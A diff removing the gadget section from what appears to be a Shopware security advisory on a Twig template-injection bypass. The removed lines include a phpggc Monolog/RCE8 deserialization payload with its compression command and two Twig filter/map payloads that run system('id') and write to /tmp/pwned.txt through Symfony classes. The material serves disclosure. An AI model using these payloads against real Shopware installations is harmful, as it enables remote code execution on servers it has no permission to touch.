@@ -135,34 +135,6 @@ This means that all of the following variable function calls are valid:
 
 Going back to [1], if $arrow is an array instead of a string or closure, the validation check to prevent invocation of unsafe functions is completely skipped. Multiple static class methods within Shopware’s codebase and its dependencies were found to be suitable gadgets for achieving for remote code execution:
 
-#### Gadget 1: 
-Using `\Shopware\Core\Framework\Adapter\Cache\CacheValueCompressor::uncompress()` to invoke unserialize()
-Serialized payload generated using the phpggc tool: 
-
-```
-./phpggc -b Monolog/RCE8 system 'id'
-```
-
-Compressed payload is generated using:
-
-```
-php -r 'echo gzcompress(shell_exec("php phpggc Monolog/RCE8 system id"));' | hexdump -v -e '"\\\x" 1/1 "%02X"'
-```
-
-#### Gadget 2: 
-Using `\Symfony\Component\VarDumper\Vardumper::setHandler()` and `\Symfony\Component\VarDumper\Vardumper::dump()` to invoke `system("id")`:
-
-```
-{{ ['system'] | filter(['\\Symfony\\Component\\VarDumper\\VarDumper', 'setHandler']) | length }}
-```
-
-#### Gadget 3: 
-Using `\Symfony\Component\Process\Process::fromShellCommandline()` to invoke `proc_open("id > /tmp/pwned.txt")`:
-
-```
-{{ {'/':'id > /tmp/pwned.txt'} | map(['\\Symfony\\Component\\Process\\Process', 'fromShellCommandline']) | map(e => e.run()) | length }}
-```
-
 ### Exploit Conditions:
 This vulnerability can be exploited if the attacker has access to:
 - an administrator account, or
